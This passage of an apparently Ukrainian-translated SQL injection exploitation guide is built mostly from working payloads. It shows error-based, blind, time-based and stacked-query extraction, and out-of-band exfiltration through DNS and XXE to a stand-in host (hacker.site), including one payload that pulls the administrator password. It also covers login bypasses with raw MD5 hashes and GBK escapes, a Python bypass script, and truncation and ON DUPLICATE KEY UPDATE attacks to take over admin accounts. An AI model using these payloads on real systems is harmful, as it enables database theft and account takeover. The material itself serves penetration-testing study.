–¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫ —Å–ª—ñ–ø–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó —Ä–∞–∑–æ–º –∑ —Ç–∞–±–ª–∏—Ü—è–º–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–º–∏ –¥–ª—è –≤–∞—à–æ—ó —Ü—ñ–ª—å–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–∞–∑–∞–º–∏ –¥–∞–Ω–∏—Ö (DBMS). –î–ª—è —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ü–∏—Ö —Ç–∞–±–ª–∏—Ü—å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó —Ü—ñ–ª—å–æ–≤–æ—ó DBMS.

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –∑–∞–ø–∏—Ç –±—É–¥–µ –≤–∏—Ç—è–≥–Ω—É—Ç–æ, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤–∞—à payload, —â–æ–± –±–µ–∑–ø–µ—á–Ω–æ –∑–∞–∫—Ä–∏—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–∞–ø–∏—Ç. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –¥–æ –≤–∞—à–æ–≥–æ payload –¥–æ–¥–∞—î—Ç—å—Å—è –∑–∞–ø–∏—Ç –æ–±'—î–¥–Ω–∞–Ω–Ω—è, —â–æ –ø–æ–ª–µ–≥—à—É—î –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é –Ω–æ–≤–æ –¥–æ—Å—Ç—É–ø–Ω–æ—ó –æ–±'—î–¥–Ω–∞–Ω–æ—ó —ñ–Ω'—î–∫—Ü—ñ—ó.

–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –ø–æ–≤–Ω–æ—ó —Å—Ç–∞—Ç—Ç—ñ, –¥–æ—Å—Ç—É–ø–Ω–æ—ó –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫

–Ø–∫—â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ** –±–∞—á–∏—Ç–∏ **–≤–∏—Ö—ñ–¥** **–∑–∞–ø–∏—Ç—É**, –∞–ª–µ –º–æ–∂–µ—Ç–µ **–±–∞—á–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏ –¥–ª—è **–µ–∫—Å—Ç—Ä–∞–∫—Ü—ñ—ó** –¥–∞–Ω–∏—Ö –∑ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.\
–°–ª—ñ–¥—É—é—á–∏ –ø–æ–¥—ñ–±–Ω–æ–º—É –ø–æ—Ç–æ–∫—É, —è–∫ —É –≤–∏–ø–∞–¥–∫—É –∑ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—î—é –Ω–∞ –æ—Å–Ω–æ–≤—ñ –æ–±'—î–¥–Ω–∞–Ω–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º–æ–≥—Ç–∏ —Å–∫–∏–Ω—É—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Å–ª—ñ–ø–æ–≥–æ SQLi

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏ –∑–∞–ø–∏—Ç—É –∞–±–æ –ø–æ–º–∏–ª–∫–∏, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ **–≤—ñ–¥—Ä—ñ–∑–Ω–∏—Ç–∏**, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç **–ø–æ–≤–µ—Ä—Ç–∞—î** **—ñ—Å—Ç–∏–Ω–Ω–µ** –∞–±–æ **—Ö–∏–±–Ω–µ** –∑–Ω–∞—á–µ–Ω–Ω—è, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ —î —Ä—ñ–∑–Ω–∏–π –≤–º—ñ—Å—Ç.\
–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, —â–æ–± –≤–∏–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö —Å–∏–º–≤–æ–ª –∑–∞ —Å–∏–º–≤–æ–ª–æ–º:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ–º–∏–ª–æ–∫ Blind SQLi

–¶–µ **—Ç–∞ —Å–∞–º–∞ —Å–∏—Ç—É–∞—Ü—ñ—è, —â–æ –π —Ä–∞–Ω—ñ—à–µ**, –∞–ª–µ –∑–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± —Ä–æ–∑—Ä—ñ–∑–Ω—è—Ç–∏ —ñ—Å—Ç–∏–Ω–Ω—É/—Ö–∏–±–Ω—É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –∑ –∑–∞–ø–∏—Ç—É, –≤–∏ –º–æ–∂–µ—Ç–µ **—Ä–æ–∑—Ä—ñ–∑–Ω—è—Ç–∏** –Ω–∞—è–≤–Ω—ñ—Å—Ç—å **–ø–æ–º–∏–ª–∫–∏** –≤ SQL –∑–∞–ø–∏—Ç—ñ —á–∏ –Ω—ñ (–º–æ–∂–ª–∏–≤–æ, —á–µ—Ä–µ–∑ —Ç–µ, —â–æ HTTP —Å–µ—Ä–≤–µ—Ä –∑—Ä–∏–≤–∞—î—Ç—å—Å—è). –¢–æ–º—É –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–º—É—Å–∏—Ç–∏ SQL –ø–æ–º–∏–ª–∫—É —â–æ—Ä–∞–∑—É, –∫–æ–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–≥–∞–¥–∞—î—Ç–µ —Å–∏–º–≤–æ–ª:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è SQLi –Ω–∞ –æ—Å–Ω–æ–≤—ñ —á–∞—Å—É

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É **–Ω–µ–º–∞—î** –∂–æ–¥–Ω–æ–≥–æ —Å–ø–æ—Å–æ–±—É **–≤—ñ–¥—Ä—ñ–∑–Ω–∏—Ç–∏** **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –∑–∞–ø–∏—Ç—É –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –ê–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É **–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏—Å—è –¥–æ–≤—à–µ**, —è–∫—â–æ –≤–≥–∞–¥–∞–Ω–∏–π —Å–∏–º–≤–æ–ª –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π. –ú–∏ –≤–∂–µ –±–∞—á–∏–ª–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É —Ä–∞–Ω—ñ—à–µ –¥–ª—è [–ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ stacked queries –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤ –ø—ñ–¥—Ä—è–¥**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ö–æ—á–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∑–∞–ø–∏—Ç–∏ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è, **—Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏** **–Ω–µ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è –≤ –¥–æ–¥–∞—Ç–æ–∫**. –û—Ç–∂–µ, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –∫–æ—Ä–∏—Å–Ω–∞ —É –∑–≤'—è–∑–∫—É –∑ **—Å–ª—ñ–ø–∏–º–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏**, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥—Ä—É–≥–∏–π –∑–∞–ø–∏—Ç –¥–ª—è –≤–∏–∫–ª–∏–∫—É DNS-–∑–∞–ø–∏—Ç—É, —É–º–æ–≤–Ω–æ—ó –ø–æ–º–∏–ª–∫–∏ –∞–±–æ –∑–∞—Ç—Ä–∏–º–∫–∏ —á–∞—Å—É.

**Oracle** –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î **stacked queries.** **MySQL, Microsoft** —Ç–∞ **PostgreSQL** —ó—Ö –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å: `QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

–Ø–∫—â–æ **–∂–æ–¥–µ–Ω —ñ–Ω—à–∏–π** –º–µ—Ç–æ–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó **–Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–≤**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–º—É—Å–∏—Ç–∏ **–±–∞–∑—É –¥–∞–Ω–∏—Ö –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏** —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –Ω–∞ **–∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Ö–æ—Å—Ç**, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –≤–∞–º–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —á–µ—Ä–µ–∑ DNS-–∑–∞–ø–∏—Ç–∏:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### –í–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –∫–∞–Ω–∞–ª–æ–º —á–µ—Ä–µ–∑ XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## –ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [SQLMap Cheatsheet](sqlmap/) –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SQLi –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## –¢–µ—Ö–Ω—ñ—á–Ω–∞ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ú–∏ –≤–∂–µ –æ–±–≥–æ–≤–æ—Ä–∏–ª–∏ –≤—Å—ñ —Å–ø–æ—Å–æ–±–∏ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ SQL Injection. –ó–Ω–∞–π–¥—ñ—Ç—å —â–µ –∫—ñ–ª—å–∫–∞ —Ç—Ä—é–∫—ñ–≤, –∑–∞–ª–µ–∂–Ω–∏—Ö –≤—ñ–¥ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —É —Ü—ñ–π –∫–Ω–∏–∑—ñ:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

–ê–±–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **–±–∞–≥–∞—Ç–æ —Ç—Ä—é–∫—ñ–≤ —â–æ–¥–æ: MySQL, PostgreSQL, Oracle, MSSQL, SQLite —Ç–∞ HQL —É** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) —î –Ω–∞–π–∞–∫—Ç—É–∞–ª—å–Ω—ñ—à–æ—é –ø–æ–¥—ñ—î—é –≤ –≥–∞–ª—É–∑—ñ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω—ñ—î—é –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º—ñ—Å—ñ—î—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –≥–∞—Ä—è—á–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —É —Å—Ñ–µ—Ä—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ –∫–æ–∂–Ω—ñ–π –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω—ñ.

{% embed url="https://www.rootedcon.com/" %}

## –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó

–°–ø–∏—Å–æ–∫ –¥–ª—è —Å–ø—Ä–æ–±–∏ –æ–±—ñ–π—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å –≤—Ö–æ–¥—É:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∏—Ä–æ–≥–æ —Ö–µ—à—É
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
–¶–µ–π –∑–∞–ø–∏—Ç –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –∫–æ–ª–∏ MD5 –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∑ true –¥–ª—è —Å–∏—Ä–æ–≥–æ –≤–∏—Ö–æ–¥—É –≤ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞—Ö –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —â–æ —Ä–æ–±–∏—Ç—å —Å–∏—Å—Ç–µ–º—É –≤—Ä–∞–∑–ª–∏–≤–æ—é –¥–æ SQL-—ñ–Ω'—î–∫—Ü—ñ–π. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º, —Å—Ç–≤–æ—Ä—é—é—á–∏ –≤–≤–µ–¥–µ–Ω–Ω—è, —è–∫—ñ, –∫–æ–ª–∏ —ó—Ö —Ö–µ—à—É—é—Ç—å, –≤–∏—Ä–æ–±–ª—è—é—Ç—å –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—ñ —á–∞—Å—Ç–∏–Ω–∏ SQL-–∫–æ–º–∞–Ω–¥, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### –û–±—Ö—ñ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω–∂–µ–∫—Ç–æ–≤–∞–Ω–æ–≥–æ —Ö–µ—à—É
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**–†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–∏–π —Å–ø–∏—Å–æ–∫**:

–í–∞–º —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —è–∫ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∫–æ–∂–µ–Ω —Ä—è–¥–æ–∫ —Å–ø–∏—Å–∫—É, –∞ —è–∫ –ø–∞—Ä–æ–ª—å –∑–∞–≤–∂–¥–∏: _**Pass1234.**_\
_(–¶—ñ –ø–µ–π–ª–æ–∞–¥–∏ —Ç–∞–∫–æ–∂ –≤–∫–ª—é—á–µ–Ω—ñ —É –≤–µ–ª–∏–∫–∏–π —Å–ø–∏—Å–æ–∫, –∑–≥–∞–¥–∞–Ω–∏–π –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ü—å–æ–≥–æ —Ä–æ–∑–¥—ñ–ª—É)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –û–±—Ö—ñ–¥

–Ø–∫—â–æ ' –µ–∫—Ä–∞–Ω—É—î—Ç—å—Å—è, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ %A8%27, –∞ –∫–æ–ª–∏ ' –±—É–¥–µ –µ–∫—Ä–∞–Ω–æ–≤–∞–Ω–æ, –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python —Å–∫—Ä–∏–ø—Ç:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### –ü–æ–ª—ñ–≥–ª–æ—Ç–Ω–∞ —ñ–Ω'—î–∫—Ü—ñ—è (–º—É–ª—å—Ç–∏–∫–æ–Ω—Ç–µ–∫—Å—Ç)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### Modify password of existing object/user

To do so you should try to **create a new object named as the "master object"** (probably **admin** in case of users) modifying something:

* Create user named: **AdMIn** (–≤–µ—Ä—Ö–Ω—ñ–π —Ç–∞ –Ω–∏–∂–Ω—ñ–π —Ä–µ–≥—ñ—Å—Ç—Ä–∏)
* Create a user named: **admin=**
* **SQL Truncation Attack** (–∫–æ–ª–∏ —î —è–∫–∏–π—Å—å **–æ–±–º–µ–∂–µ–Ω–Ω—è –ø–æ –¥–æ–≤–∂–∏–Ω—ñ** –≤ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ–π –ø–æ—à—Ç—ñ) --> Create user with name: **admin \[–±–∞–≥–∞—Ç–æ –ø—Ä–æ–±—ñ–ª—ñ–≤] a**

#### SQL Truncation Attack

If the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user **admin**, try to create a username called: "_admin \[30 –ø—Ä–æ–±—ñ–ª—ñ–≤] a_" and any password.

The database will **check** if the introduced **username** **exists** inside the database. If **not**, it will **cut** the **username** to the **max allowed number of characters** (in this case to: "_admin \[25 –ø—Ä–æ–±—ñ–ª—ñ–≤]_") and the it will **automatically remove all the spaces at the end updating** inside the database the user "**admin**" with the **new password** (some error could appear but it doesn't means that this hasn't worked).

More info: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Note: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Insert time based checking

Add as much `','',''` as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

–ö–ª–∞—É–∑—É–ª–∞ `ON DUPLICATE KEY UPDATE` –≤ MySQL –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥—ñ–π, —è–∫—ñ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö –ø–æ–≤–∏–Ω–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏, –∫–æ–ª–∏ —Ä–æ–±–∏—Ç—å—Å—è —Å–ø—Ä–æ–±–∞ –≤—Å—Ç–∞–≤–∏—Ç–∏ —Ä—è–¥–æ–∫, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –¥—É–±–ª—é–≤–∞–Ω–Ω—è –∑–Ω–∞—á–µ–Ω–Ω—è –≤ —É–Ω—ñ–∫–∞–ª—å–Ω–æ–º—É —ñ–Ω–¥–µ–∫—Å—ñ –∞–±–æ –ø–µ—Ä–≤–∏–Ω–Ω–æ–º—É –∫–ª—é—á—ñ. –ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é –º–æ–∂–Ω–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –¥–ª—è –∑–º—ñ–Ω–∏ –ø–∞—Ä–æ–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:

Example Payload Injection:

–í–∞–Ω—Ç–∞–∂ –¥–ª—è —ñ–Ω'—î–∫—Ü—ñ—ó –º–æ–∂–µ –±—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –¥–µ –Ω–∞–º–∞–≥–∞—é—Ç—å—Å—è –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–≤–∞ —Ä—è–¥–∫–∏ –≤ —Ç–∞–±–ª–∏—Ü—é `users`. –ü–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ —î –ø—Ä–∏–º–∞–Ω–∫–æ—é, –∞ –¥—Ä—É–≥–∏–π —Ä—è–¥–æ–∫ –Ω–∞—Ü—ñ–ª–µ–Ω–∏–π –Ω–∞ —ñ—Å–Ω—É—é—á—É –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∑ –Ω–∞–º—ñ—Ä–æ–º –æ–Ω–æ–≤–∏—Ç–∏ –ø–∞—Ä–æ–ª—å:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
–û—Å—å —è–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:

- –ó–∞–ø–∏—Ç –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–≤–∞ —Ä—è–¥–∫–∏: –æ–¥–∏–Ω –¥–ª—è `generic_user@example.com` —ñ —ñ–Ω—à–∏–π –¥–ª—è `admin_generic@example.com`.
- –Ø–∫—â–æ —Ä—è–¥–æ–∫ –¥–ª—è `admin_generic@example.com` –≤–∂–µ —ñ—Å–Ω—É—î, —Å–ø—Ä–∞—Ü—å–æ–≤—É—î –∫–ª–∞—É–∑—É–ª–∞ `ON DUPLICATE KEY UPDATE`, —è–∫–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ç—É—î MySQL –æ–Ω–æ–≤–∏—Ç–∏ –ø–æ–ª–µ `password` —ñ—Å–Ω—É—é—á–æ–≥–æ —Ä—è–¥–∫–∞ –Ω–∞ "bcrypt_hash_of_newpassword".
